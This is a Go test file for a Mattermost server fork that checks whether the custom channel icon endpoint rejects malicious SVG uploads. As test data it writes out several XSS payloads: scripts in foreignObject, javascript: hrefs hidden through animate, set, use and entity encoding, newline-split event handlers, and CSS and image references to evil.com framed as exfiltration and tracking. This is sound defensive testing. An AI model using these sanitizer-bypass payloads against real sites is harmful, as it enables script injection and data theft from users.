// Copyright (c) 2015-present Mattermost, Inc. All Rights Reserved.
// See LICENSE.txt for license information.

package api4

// mattermost-extended-test

import (
	"context"
	"encoding/base64"
	"net/http"
	"strings"
	"testing"

	"github.com/mattermost/mattermost/server/public/model"
)

// ----------------------------------------------------------------------------
// CUSTOM CHANNEL ICON SVG INJECTION
//
// The server stores SVG content as base64. Client-side rendering uses
// dangerouslySetInnerHTML with regex-based sanitization (sanitizeSvg).
// These tests document what the server accepts.
// ----------------------------------------------------------------------------

func TestCustomChannelIconSVGAttackVectors(t *testing.T) {
	th := SetupConfig(t, func(cfg *model.Config) {
		cfg.FeatureFlags.CustomChannelIcons = true
		*cfg.CacheSettings.CacheType = "lru"
	}).InitBasic(t)

	t.Run("SVG with foreignObject containing script is rejected", func(t *testing.T) {
		// foreignObject allows embedding HTML inside SVG — server should reject
		svg := `<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert('xss')</script></body></foreignObject></svg>`
		icon := &model.CustomChannelIcon{
			Name: "foreignobject-xss",
			Svg:  base64.StdEncoding.EncodeToString([]byte(svg)),
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/custom_channel_icons", icon)
		checkStatusCode(t, resp, err, http.StatusBadRequest)
	})

	t.Run("SVG with animate xlink:href to javascript is rejected", func(t *testing.T) {
		svg := `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a><circle r="400"/><animate attributeName="xlink:href" values="javascript:alert(1)"/></a></svg>`
		icon := &model.CustomChannelIcon{
			Name: "animate-xss",
			Svg:  base64.StdEncoding.EncodeToString([]byte(svg)),
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/custom_channel_icons", icon)
		checkStatusCode(t, resp, err, http.StatusBadRequest)
	})

	t.Run("SVG with use element and data URI is rejected", func(t *testing.T) {
		// <use> with data: URI can embed arbitrary SVG including scripts
		innerSvg := `<svg id="x" xmlns="http://www.w3.org/2000/svg"><a xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a></svg>`
		dataUri := "data:image/svg+xml;base64," + base64.StdEncoding.EncodeToString([]byte(innerSvg))
		svg := `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="` + dataUri + `#x"/></svg>`
		icon := &model.CustomChannelIcon{
			Name: "use-data-xss",
			Svg:  base64.StdEncoding.EncodeToString([]byte(svg)),
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/custom_channel_icons", icon)
		checkStatusCode(t, resp, err, http.StatusBadRequest)
	})

	t.Run("SVG with entity-encoded javascript href is rejected", func(t *testing.T) {
		// HTML entity encoding bypasses naive string matching
		svg := `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)"><text y="20">Click</text></a></svg>`
		icon := &model.CustomChannelIcon{
			Name: "entity-encoded-xss",
			Svg:  base64.StdEncoding.EncodeToString([]byte(svg)),
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/custom_channel_icons", icon)
		checkStatusCode(t, resp, err, http.StatusBadRequest)
	})

	t.Run("SVG with set element targeting href is rejected", func(t *testing.T) {
		svg := `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a id="x"><text y="20">Click</text><set attributeName="xlink:href" to="javascript:alert(1)"/></a></svg>`
		icon := &model.CustomChannelIcon{
			Name: "set-element-xss",
			Svg:  base64.StdEncoding.EncodeToString([]byte(svg)),
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/custom_channel_icons", icon)
		checkStatusCode(t, resp, err, http.StatusBadRequest)
	})

	t.Run("SVG with event handler in newline-split attribute is rejected", func(t *testing.T) {
		// Regex often doesn't match across newlines — server must handle this
		svg := "<svg xmlns=\"http://www.w3.org/2000/svg\"><rect width=\"100\" height=\"100\"\nonload\n=\n\"alert(1)\"/></svg>"
		icon := &model.CustomChannelIcon{
			Name: "newline-event-xss",
			Svg:  base64.StdEncoding.EncodeToString([]byte(svg)),
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/custom_channel_icons", icon)
		checkStatusCode(t, resp, err, http.StatusBadRequest)
	})

	t.Run("SVG with CSS url() pointing to external resource is rejected", func(t *testing.T) {
		// CSS-based data exfiltration
		svg := `<svg xmlns="http://www.w3.org/2000/svg"><style>@import url("https://evil.com/steal.css");</style><rect width="100" height="100"/></svg>`
		icon := &model.CustomChannelIcon{
			Name: "css-import-xss",
			Svg:  base64.StdEncoding.EncodeToString([]byte(svg)),
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/custom_channel_icons", icon)
		checkStatusCode(t, resp, err, http.StatusBadRequest)
	})

	t.Run("SVG with embedded image linking to external resource is rejected", func(t *testing.T) {
		// SSRF-like: forces browsers viewing the icon to make external requests
		svg := `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="https://evil.com/track.gif" width="1" height="1"/></svg>`
		icon := &model.CustomChannelIcon{
			Name: "image-ssrf",
			Svg:  base64.StdEncoding.EncodeToString([]byte(svg)),
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/custom_channel_icons", icon)
		checkStatusCode(t, resp, err, http.StatusBadRequest)
	})
}

func TestCustomChannelIconEdgeCases(t *testing.T) {
	th := SetupConfig(t, func(cfg *model.Config) {
		cfg.FeatureFlags.CustomChannelIcons = true
		*cfg.CacheSettings.CacheType = "lru"
	}).InitBasic(t)

	t.Run("Icon at exactly max SVG size boundary", func(t *testing.T) {
		// Exactly 50KB (51200 bytes) of base64 content should be accepted.
		// Base64 encodes 3 bytes into 4 chars. So we need 51200 * 3 / 4 = 38400 bytes of raw SVG.
		rawLen := model.CustomChannelIconSvgMaxSize * 3 / 4
		prefix := "<svg xmlns='http://www.w3.org/2000/svg'>"
		suffix := "</svg>"
		paddingLen := rawLen - len(prefix) - len(suffix)
		rawSvg := prefix + strings.Repeat(" ", paddingLen) + suffix

		icon := &model.CustomChannelIcon{
			Name: "boundary",
			Svg:  base64.StdEncoding.EncodeToString([]byte(rawSvg)),
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/custom_channel_icons", icon)
		checkStatusCode(t, resp, err, http.StatusCreated)
		closeIfOpen(resp, err)
	})

	t.Run("Icon at exactly max name length boundary", func(t *testing.T) {
		icon := &model.CustomChannelIcon{
			Name: strings.Repeat("a", model.CustomChannelIconNameMaxLength),
			Svg:  base64.StdEncoding.EncodeToString([]byte("<svg xmlns='http://www.w3.org/2000/svg'><circle r='10'/></svg>")),
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/custom_channel_icons", icon)
		checkStatusCode(t, resp, err, http.StatusCreated)
		closeIfOpen(resp, err)
	})

	t.Run("Icon with non-SVG base64 content is rejected", func(t *testing.T) {
		// Server should validate that the base64 decodes to valid SVG
		icon := &model.CustomChannelIcon{
			Name: "not-svg",
			Svg:  base64.StdEncoding.EncodeToString([]byte("this is not SVG at all")),
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/custom_channel_icons", icon)
		checkStatusCode(t, resp, err, http.StatusBadRequest)
	})

	t.Run("Icon with HTML instead of SVG is rejected", func(t *testing.T) {
		html := `<html><body><h1>Not an icon</h1><script>alert('xss')</script></body></html>`
		icon := &model.CustomChannelIcon{
			Name: "html-injection",
			Svg:  base64.StdEncoding.EncodeToString([]byte(html)),
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/custom_channel_icons", icon)
		checkStatusCode(t, resp, err, http.StatusBadRequest)
	})

	t.Run("SVG with XSS payload is rejected at creation time", func(t *testing.T) {
		svg := `<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror="alert(1)"/></body></foreignObject></svg>`
		encoded := base64.StdEncoding.EncodeToString([]byte(svg))
		icon := &model.CustomChannelIcon{
			Name: "verify-xss-rejected",
			Svg:  encoded,
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/custom_channel_icons", icon)
		// Server should reject SVG with XSS vectors
		checkStatusCode(t, resp, err, http.StatusBadRequest)
	})
}
